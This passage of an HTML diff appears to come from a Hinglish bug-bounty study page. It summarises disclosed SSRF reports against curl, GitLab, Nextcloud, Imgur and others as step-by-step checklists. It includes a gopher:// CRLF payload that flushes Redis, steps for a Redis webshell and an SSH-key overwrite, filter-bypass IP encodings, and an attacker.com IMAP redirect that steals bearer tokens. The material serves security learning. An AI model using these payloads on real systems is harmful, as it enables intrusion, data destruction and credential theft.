+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Internal shares read karo</strong> — <code
+                                    class="c">file://internal-fileserver/C$/secrets.txt</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Cloud metadata bhi check karo</strong> — SMB allow ho toh
+                                Azure metadata read possible hai.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 PRO TIP</div>
+                        <div class="protip-text">Every SSRF doesn't need a cloud metadata IP. Kabhi-kabhi OS ka apna
+                            default behaviour (Windows UNC → SMB → NTLM) hi sabse bada security hole hota hai.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #15 -->
+            <div class="report-card" data-severity="na" id="report-15">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #15 · Category 35.15</div>
+                        <div class="report-title">SSRF via IPFS CID Path Traversal — URL Rewriting Bypass (curl)</div>
+                        <div class="report-target">🎯 curl (IPFS Logic) · @donutshunter · N/A</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Path Traversal</span><span
+                                class="technique-tag">URL Rewriting</span><span class="technique-tag">IPFS
+                                Gateway</span></div>
+                    </div><span class="severity-badge sev-na">⚪ N/A</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">ipfs://..%2f..%2fapi/v0/shutdown</code> → curl ne
+                            rewrite kiya → <code class="c">http://127.0.0.1:5001/ipfs/../../api/v0/shutdown</code> →
+                            Path normalize hua → Internal Admin API (/api/v0/shutdown) hit → IPFS node remote shutdown!
+                            DoS + Info Disclosure possible.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Protocol rewriting test karo</strong> — Koi app <code
+                                    class="c">custom://</code> URLs ko <code class="c">http://</code> mein badalti hai?
+                                Path traversal (<code class="c">../</code>) try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Proxy admin endpoints hit karo</strong> — URL manipulation se
+                                proxy ke Admin endpoints check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Normalization check karo</strong> — <code class="c">%2f</code>
+                                aur <code class="c">/</code> ko backend kaise handle karta hai? Double-encoding (<code
+                                    class="c">%252f</code>) try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Admin API endpoints scan karo</strong> — <code
+                                    class="c">/api/v0/id</code>, <code class="c">/api/v0/config</code>, <code
+                                    class="c">/api/v0/shutdown</code></span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">👑 VETERAN MINDSET</div>
+                        <div class="mindset-text">"Client-side protection is not a security boundary. User-controlled
+                            input ko bina Normalization ke path mein mat chipkao."</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #16 -->
+            <div class="report-card" data-severity="na" id="report-16">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #16 · Category 35.16</div>
+                        <div class="report-title">Gopher Protocol Smuggling — CRLF Injection to Redis RCE (curl)</div>
+                        <div class="report-target">🎯 curl (Gopher Protocol) · @0x0000nosfu · N/A (Feature)</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Gopher</span><span
+                                class="technique-tag">CRLF Injection</span><span class="technique-tag">Redis
+                                RCE</span><span class="technique-tag">Protocol Smuggling</span></div>
+                    </div><span class="severity-badge sev-na">⚪ N/A</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Gopher URL mein <code class="c">%0d%0a</code> (CRLF) inject karke
+                            multiple Redis commands smuggle kiye: <code
+                                class="c">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall</code> → Redis ne valid
+                            commands samjha → Data delete, PHP webshell write, SSH keys overwrite → SSRF se seedha RCE!
+                        </div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Gopher support check karo</strong> — SSRF milte hi <code
+                                    class="c">gopher://</code> try karo. HTTP se kahin zyada khatarnak hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>CRLF injection test karo</strong> — URL mein <code
+                                    class="c">%0d%0a</code> daal ke dekho server multiple lines bhej raha hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Internal services hit karo</strong> — Port 6379 (Redis), 11211
+                                (Memcached), 25 (SMTP) ko Gopher se target karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Webshell write karo</strong> — Redis <code
+                                    class="c">CONFIG SET dir /var/www/html</code> → PHP shell save → RCE!</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>SSH key overwrite karo</strong> — Redis se <code
+                                    class="c">authorized_keys</code> mein apni key daalke SSH access lo.</span>
+                        </li>
+                    </ul>
+                    <div class="impact-box">
+                        <div class="impact-label">💥 MAXIMUM IMPACT</div>
+                        <div class="impact-text">Old protocols never die, they just become weapons. Gopher SSRF hunting
+                            mein "Universal Exploit Tool" hai — Redis, SMTP, Memcached sab control possible!</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #17 -->
+            <div class="report-card" data-severity="critical" id="report-17">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #17 · Category 35.17</div>
+                        <div class="report-title">Project Import SSRF — CarrierWave Remote URL Exploit (GitLab)</div>
+                        <div class="report-target">🎯 GitLab.com · @vakzz · Critical · $10,000</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">CarrierWave</span><span
+                                class="technique-tag">JSON Import</span><span
+                                class="technique-tag">remote_attachment_url</span></div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">GitLab project import mein <code class="c">project.json</code> ke
+                            Note model mein <code class="c">remote_attachment_url</code> attribute inject kiya.
+                            CarrierWave ne import ke waqt us URL fetch kiya → AWS Metadata as "Attached File" →
+                            Prometheus (9090), Consul (8500) ports bhi accessible! <strong>$10,000 bounty!</strong>
+                        </div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>JSON imports audit karo</strong> — App JSON/XML import karti
+                                hai? Hidden attributes (<code class="c">remote_*_url</code>) inject karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Third-party uploaders check karo</strong> — CarrierWave,
+                                Paperclip, Shrink ke Remote Download features SSRF test karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Attachment se exfiltrate karo</strong> — SSRF response browser
+                                mein nahi dikhta? File/avatar/attachment ki tarah save karwa ke read karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Local GitLab test karo</strong> — Local instance par export
+                                karo, JSON edit karo, import karo → SSRF confirm!</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Internal ports scan karo</strong> — 9090 (Prometheus), 8500
+                                (Consul), 6379 (Redis) check karo.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                        <div class="chain-formula">Project Export → JSON Edit → remote_attachment_url Inject → Import
+                            Trigger → CarrierWave Fetch → Cloud Metadata → $10K</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #18 -->
+            <div class="report-card" data-severity="na" id="report-18">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #18 · Category 35.18</div>
+                        <div class="report-title">Gopher CRLF Command Injection — Duplicate & AI Lesson (curl)</div>
+                        <div class="report-target">🎯 curl (lib/gopher.c) · @andrew-bbp · N/A (Duplicate + AI)</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">CRLF Injection</span><span
+                                class="technique-tag">Duplicate</span><span class="technique-tag">AI Violation</span>
+                        </div>
+                    </div><span class="severity-badge sev-na">⚪ N/A</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Same Gopher CRLF technique (<code class="c">%0d%0a</code> inject
+                            karke Redis/SMTP commands smuggle karna) par report. <strong>Reject hua:</strong> (1)
+                            Duplicate — pehle report ho chuka hai, (2) AI-generated report tha aur hacker ne declare
+                            nahi kiya → HackerOne rules violation!</div>
+                    </div>
+                    <div class="checklist-label">✅ KEY LESSONS CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>CRLF in protocols hamesha check karo</strong> — <code
+                                    class="c">%0d%0a</code> se server multiple requests bhej raha hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Redis/SMTP target karo</strong> — Gopher SSRF milte hi
+                                internal Redis (6379) ya SMTP (25) par commands smuggle karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>AI blindly use mat karo</strong> — Bug Bounty mein AI report
+                                structure ke liye use karo, par content hamesha manual testing se likho!</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Pehle se reported bugs check karo</strong> — Duplicate report
+                                karne se pehle existing disclosures research karo.</span>
+                        </li>
+                    </ul>
+                    <div class="impact-box">
+                        <div class="impact-label">⚠️ KEY LESSON</div>
+                        <div class="impact-text">Bug bounty mein Originality ki bahut value hai. AI ka use structure ke
+                            liye karo, lekin testing aur findings hamesha manual honi chahiye.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ PHASE 4 — FILTER BYPASS & IP ENCODING ═══ -->
+    <section class="phase-section" id="phase4">
+        <div class="phase-header"><span class="phase-number">PHASE 04</span><span class="phase-title">FILTER BYPASS & IP ENCODING ATTACKS</span><span class="phase-count" id="p4count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase4">
+
+            <!-- REPORT #19 -->
+            <div class="report-card" data-severity="medium" id="report-19">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #19 · Category 35.19</div>
+                    <div class="report-title">DNS Rebinding Bypass — ssrf_filter Ruby Gem ToCToU (Ruby)</div>
+                    <div class="report-target">🎯 ssrf_filter Ruby Gem · @newby99 · Informative</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">DNS Rebinding</span><span class="technique-tag">ToCToU</span><span class="technique-tag">Regression Bug</span></div>
+                </div><span class="severity-badge sev-info">🔵 INFO</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">ssrf_filter v1.3.0 mein regression: purane version mein <code class="c">uri.hostname = ip</code> tha (safe), naye mein hata diya. Ab Net::HTTP hostname se wapas DNS resolve karta hai → DNS Rebinding: pehli query 8.8.8.8, doosri query 127.0.0.1 → Filter bypass → Localhost hit! Ruby 2.7+ mein <code class="c">ipaddr:</code> parameter fix hai.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Hostname passing check karo</strong> — Filter IP validate karne ke baad wapas Hostname use kar raha hai? DNS Rebinding vulnerable hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Validate resolution once</strong> — DNS resolution ek baar honi chahiye. Wahi IP use karo jo validate kiya.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Library updates check karo</strong> — Ruby, Python ke naye updates mein security features (<code class="c">ipaddr:</code>) add hue?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Version diffing karo</strong> — Purane aur naye code compare karo — kya koi security line remove hui?</span></li>
+                    </ul>
+                    <div class="mindset-box"><div class="mindset-label">👑 VETERAN MINDSET</div><div class="mindset-text">"The gap between validation and execution is where hackers play." DNS Rebinding purana hai, par modern libraries mein regression ban kar wapas aa sakta hai.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #20 -->
+            <div class="report-card" data-severity="na" id="report-20">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #20 · Category 35.20</div>
+                    <div class="report-title">IPv4-mapped IPv6 Parsing Inconsistency — Mixed IP Bypass (curl)</div>
+                    <div class="report-target">🎯 curl (IP Parser) · @z3r0yu · N/A (OS Behavior)</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">IPv6 Mapping</span><span class="technique-tag">Octal Confusion</span><span class="technique-tag">Parser Inconsistency</span></div>
+                </div><span class="severity-badge sev-na">⚪ N/A</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">::ffff:0127.0.0.1</code> → Validator ne socha 0127 octal hai ya invalid → Allow kiya. Par curl (macOS) ne leading zero ignore kiya → Request seedha <code class="c">127.0.0.1</code> par! Validator aur Requester ke beech ki inconsistency = SSRF bypass.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Mixed IP notations test karo</strong> — <code class="c">::ffff:127.0.0.1</code>, <code class="c">::ffff:7f00:0001</code>, <code class="c">::ffff:0177.0.0.1</code></span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>OS behavior compare karo</strong> — Linux vs Windows vs Mac — parsing behavior change hota hai.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Leading zeros test karo</strong> — <code class="c">0127</code>, <code class="c">000.0.0.1</code> daal ke dekho filter bypass hota hai?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Validator vs Requester gap exploit karo</strong> — Do systems ek hi IP ko alag samajhein = Bypass!</span></li>
+                    </ul>
+                    <div class="protip-box"><div class="protip-label">💡 PRO TIP</div><div class="protip-text">Security is often lost in translation. Jab Validator aur Requester ek hi cheez ko alag tarike se samajhte hain, wahi hacker ke liye mauka hota hai.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #21 -->
+            <div class="report-card" data-severity="medium" id="report-21">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #21 · Category 35.21</div>
+                    <div class="report-title">Octal IP Notation Bypass — ThrowIfLocalIp Defeat (Nextcloud)</div>
+                    <div class="report-target">🎯 Nextcloud Server · @obitorasu & @w1redch4d · Medium · $250</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Octal IP</span><span class="technique-tag">filter_var Bypass</span><span class="technique-tag">IP Encoding</span></div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text"><code class="c">ThrowIfLocalIp</code> function sirf decimal IPs check kar raha tha. Hacker ne <code class="c">127.0.0.1</code> ko Octal mein convert kiya → <code class="c">0177.0.0.1</code>. PHP ka <code class="c">filter_var()</code> ise "Private" nahi mana → Filter bypass → curl ne resolve karke localhost hit kiya! Cloud metadata bhi: <code class="c">0251.0376.0251.0376</code></div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Octal/Hex IPs try karo</strong> — 127.0.0.1 blocked? <code class="c">0177.0.0.1</code> (Octal) ya <code class="c">0x7f000001</code> (Hex) try karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Cloud metadata bypass karo</strong> — <code class="c">169.254.169.254</code> blocked? Encoded formats try karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>PHP filter_var gaps check karo</strong> — Purane PHP versions mein octal notation "Private" nahi manta!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Enclosed Alphanumerics bhi try karo</strong> — Unicode character tricks (<code class="c">⑯⑨。②⑤④</code>) se filter confuse karo.</span></li>
+                    </ul>
+                    <div class="mindset-box"><div class="mindset-label">👑 VETERAN MINDSET</div><div class="mindset-text">"Blacklists are always incomplete. Developers ne IPs toh block kiye, par IPs likhne ke tarike (notations) block karna bhool gaye."</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #22 -->
+            <div class="report-card" data-severity="critical" id="report-22">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #22 · Category 35.22</div>
+                    <div class="report-title">[H1-2006 CTF] Path Traversal → Open Redirect → SSRF Chain (BountyPay)</div>
+                    <div class="report-target">🎯 BountyPay CTF · @0xbeefed · Critical</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Path Traversal</span><span class="technique-tag">Open Redirect</span><span class="technique-tag">JSON Token Manipulation</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Token mein <code class="c">account_id</code> ko <code class="c">../../redirect?url=https://software.bountypay.h1ctf.com/</code> se replace kiya → API server ne internal path backtrack kiya → Open redirect se restricted software portal fetch → APK dhoondhi → Decompile → Static tokens → CSS Injection se 2FA codes churaaye!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>JSON tokens check karo</strong> — Cookie/token mein JSON hai? Parameters (id, path) mein <code class="c">../</code> daal ke internal path badal raha hai?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Open Redirect chain karo</strong> — SSRF limited hai? Usi domain par Open Redirect dhoondho → Internal URL pivot!</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Internal scanning automate karo</strong> — SSRF milte hi script (ssrfmapper.py) likho jo internal subdomains scan kare.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>.git folders check karo</strong> — App subdomains par <code class="c">/.git</code> folder khula hai? Source code + credentials mil sakti hain.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">05</span><span class="item-text"><strong>APK decompile karo</strong> — Internal apps dhoondho → jadx/apktool se reverse engineer → Hardcoded secrets nikaalo.</span></li>
+                    </ul>
+                    <div class="chain-box"><div class="chain-label">⛓️ CHAIN FORMULA</div><div class="chain-formula">Git Dump → Source Code → Path Traversal → Open Redirect → SSRF → APK → Decompile → Static Tokens → CSS Injection → 2FA Steal → Full Takeover</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #23 -->
+            <div class="report-card" data-severity="critical" id="report-23">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #23 · Category 35.23</div>
+                    <div class="report-title">Full Protocol SSRF — SMTP Relay + UDP Crafting (Imgur)</div>
+                    <div class="report-target">🎯 imgur.com · @aesteral · Critical · $2,000+</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Multi-Protocol</span><span class="technique-tag">Gopher SMTP</span><span class="technique-tag">TFTP UDP</span><span class="technique-tag">libcurl</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Imgur ne libcurl ko protocol restrict nahi kiya → sftp:// se <code class="c">libssh2_1.4.2</code> version leak, dict:// se <code class="c">libcurl 7.40.0</code> leak. Gopher se SMTP relay (spam email bhejwana), TFTP se UDP packets craft, FTP se socket exhaustion DoS. Redirect bypass bhi: Imgur 302 follow karta tha → Filter bypass!</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>All curl wrappers test karo</strong> — <code class="c">dict://</code>, <code class="c">gopher://</code>, <code class="c">tftp://</code>, <code class="c">ldap://</code>, <code class="c">sftp://</code> try karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Redirect se chain karo</strong> — Input filter ho raha hai? 302 redirect se complex payloads (Gopher) execute karwao.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>Version leaks nikaalo</strong> — SSH/SFTP connections se internal libraries ke version nikaalo → Known CVEs dhoondho.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>SMTP relay test karo</strong> — Gopher se email bhejwa kar spam relay prove karo.</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">05</span><span class="item-text"><strong>DoS potential check karo</strong> — FTP timeout exhaustion se server resources drain possible?</span></li>
+                    </ul>
+                    <div class="impact-box"><div class="impact-label">💥 MAXIMUM IMPACT</div><div class="impact-text">Default configurations are a security nightmare. libcurl by default bahut protocols support karta hai. Limit na karo toh server ek "Proxy" ban jata hai attackers ke liye.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+            <!-- REPORT #24 -->
+            <div class="report-card" data-severity="low" id="report-24">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #24 · Category 35.24 · CVE-2025-14524</div>
+                    <div class="report-title">OAuth2 Bearer Token Leak — Cross-Protocol Redirect (libcurl)</div>
+                    <div class="report-target">🎯 libcurl · @anonymous_237 · Low · CVE Assigned</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Bearer Token</span><span class="technique-tag">Cross-Protocol</span><span class="technique-tag">IMAP Redirect</span></div>
+                </div><span class="severity-badge sev-low">🟢 LOW</span></div>
+                <div class="card-body">
+                    <div class="scenario-box"><div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">libcurl redirect par username/password toh delete karta tha, par <code class="c">CURLOPT_XOAUTH2_BEARER</code> token delete karna bhool gaya! Trusted site → <code class="c">imap://attacker.com:1430/</code> redirect → curl ne IMAP XOAUTH2 authenticate kiya → Bearer token hacker ke server par leak! Account Takeover possible.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">01</span><span class="item-text"><strong>Redirect behaviors audit karo</strong> — Client redirects ke waqt Auth Headers strip kar raha hai ya nahi?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">02</span><span class="item-text"><strong>Cross-protocol test karo</strong> — HTTP se IMAP, SMTP, FTP par redirect hone par tokens leak ho rahe hain?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">03</span><span class="item-text"><strong>SASL support check karo</strong> — Target IMAP/SMTP hai? Client automatically XOAUTH2 attempt kar raha hai?</span></li>
+                        <li class="checklist-item" onclick="toggleItem(this)"><div class="item-checkbox"></div><span class="item-step">04</span><span class="item-text"><strong>Rogue server setup karo</strong> — Python script se fake IMAP server banao jo tokens capture kare.</span></li>
+                    </ul>
+                    <div class="protip-box"><div class="protip-label">💡 PRO TIP</div><div class="protip-text">Security fixes must be comprehensive. Purane CVE-2022-27774 ko fix karte waqt ek naye type ke token ko chodd dena hi is vulnerability ki wajah bana.</div></div>
+                    <div class="card-progress"><div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span class="card-progress-pct">0%</span></div><div class="card-bar-wrap"><div class="card-bar-fill"></div></div></div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- ═══ PHASE 5 — ADVANCED CHAINS & ESCALATION ═══ -->
+    <section class="phase-section" id="phase5">
+        <div class="phase-header"><span class="phase-number">PHASE 05</span><span class="phase-title">ADVANCED CHAINS & REAL-WORLD ESCALATION</span><span class="phase-count" id="p5count">0 / 6 reports</span></div>
+        <div class="cards-grid" id="grid-phase5">
+
+            <!-- REPORT #25 -->
+            <div class="report-card" data-severity="high" id="report-25">
+                <div class="card-header"><div class="card-meta">
+                    <div class="report-number">◈ REPORT #25 · Category 35.25</div>
+                    <div class="report-title">Missing Link-Local Check — IMDS Access via Link Unfurling (Basecamp)</div>
+                    <div class="report-target">🎯 Basecamp / Campfire · @brumbelow · High</div>
